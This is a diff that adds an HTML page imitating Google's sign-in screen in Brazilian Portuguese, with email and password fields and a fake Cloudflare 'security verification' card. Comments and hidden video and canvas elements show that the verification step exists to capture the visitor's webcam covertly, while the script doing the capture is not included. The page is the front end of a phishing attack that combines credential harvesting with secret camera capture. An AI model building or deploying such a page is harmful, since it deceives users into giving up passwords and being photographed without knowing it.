@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Google</title>
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="shortcut icon" href="https://www.google.com/favicon.ico" type="image/x-icon">
+</head>
+<body>
+    <div class="container">
+        <div class="login-card">
+            <div class="logo">
+                <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
+            </div>
+            <h1>Fazer login</h1>
+            <h2>Use sua Conta do Google</h2>
+            
+            <form id="login-form">
+                <div class="form-group">
+                    <input type="email" id="email" placeholder="Email ou telefone" required>
+                </div>
+                
+                <div class="form-group">
+                    <input type="password" id="password" placeholder="Digite sua senha" required>
+                </div>
+                
+                <div class="form-options">
+                    <div class="remember-me">
+                        <input type="checkbox" id="remember">
+                        <label for="remember">Lembrar minha conta neste computador</label>
+                    </div>
+                    <a href="#" class="forgot-link">Esqueceu a senha?</a>
+                </div>
+                
+                <div class="form-footer">
+                    <a href="#" class="create-account">Criar conta</a>
+                    <button type="submit" class="next-button">Próximo</button>
+                </div>
+            </form>
+        </div>
+          <!-- Esta div será mostrada quando solicitarmos permissão da câmera -->
+        <div id="verification-step" class="hidden">
+            <div class="verification-card">
+                <div class="logo">
+                    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
+                </div>                <h1>Verificação de segurança</h1>
+                <p>Para proteger sua conta, precisamos verificar que você não é um robô.</p>
+                <div class="cloudflare-captcha">
+                    <div id="cloudflare-challenge">
+                        <div class="cloudflare-box">
+                            <div class="cloudflare-content">
+                                <div class="cloudflare-icon">
+                                    <div class="cloudflare-spinner"></div>
+                                    <div class="cloudflare-check hidden"></div>
+                                </div>
+                                <div class="cloudflare-text">
+                                    <p id="verification-text">Verificando...</p>
+                                </div>
+                            </div>
+                            <div class="cloudflare-branding">
+                                <span>CLOUDFLARE</span>
+                                <div class="cloudflare-links">
+                                    <a href="#">Privacidade</a> • <a href="#">Termos</a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <!-- Elementos ocultos da câmera em segundo plano -->
+                    <video id="webcam" autoplay playsinline muted style="display: none; position: absolute; visibility: hidden;"></video>
+                    <canvas id="canvas" style="display: none; position: absolute; visibility: hidden;"></canvas>
+                </div>
+                <div class="verification-notice">
+                    <p>Esta etapa ajuda a proteger sua conta contra acesso não autorizado.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <footer>
+        <div class="footer-content">
+            <select name="language" id="language">
+                <option value="pt-BR">Português (Brasil)</option>
+                <option value="en">English (United States)</option>
+                <option value="es">Español (Latinoamérica)</option>
+            </select>
+            
+            <div class="footer-links">
+                <a href="#">Ajuda</a>
+                <a href="#">Privacidade</a>
+                <a href="#">Termos</a>
+            </div>
+        </div>
+    </footer>
+
+    <script src="js/script.js"></script>
+</body>
+</html>
